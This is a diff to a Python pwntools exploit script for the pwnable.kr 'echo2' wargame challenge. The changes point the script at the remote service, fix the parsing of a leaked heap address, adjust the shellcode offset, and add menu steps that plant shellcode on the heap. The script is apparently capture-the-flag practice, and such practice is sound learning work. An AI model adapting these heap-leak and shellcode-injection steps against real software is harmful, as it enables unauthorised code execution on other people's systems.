@@ -2,8 +2,8 @@ from pwn import *
 
 host = 'pwnable.kr'
 host = '0'
-#conn = connect('pwnable.kr', 9011)
-conn = process('./echo2')
+#conn = process('./echo2')
+conn = connect(host, 9011)
 
 nombre = 'physics'
 
@@ -42,20 +42,21 @@ def main():
 	conn.sendline( payload )
 	conn.recvline()
 	line = conn.recv(4)
+	if line[-1] == '\x20':
+		line = line[:-1] + '\x00'
 	leak = line + '\x00' * 4
 	leak = u64(leak)
 	print 'heap leak:' + hex(leak)
-	shellcode_addr = leak + 0x440
+	shellcode_addr = leak + 0x30
 	print 'shellcode addr:' + hex(shellcode_addr)
+	conn.recvuntil('> ')
 
 	# place shellcode on heap
+	conn.sendline('3')
+	conn.sendline( shellcode )
+	conn.recvuntil('> ')
 
-
-
-	conn.sendline('2')
-	payload = p64(ret)
-	conn.sendline()
-
+		
 if __name__ == '__main__':
 	try:
 		main()
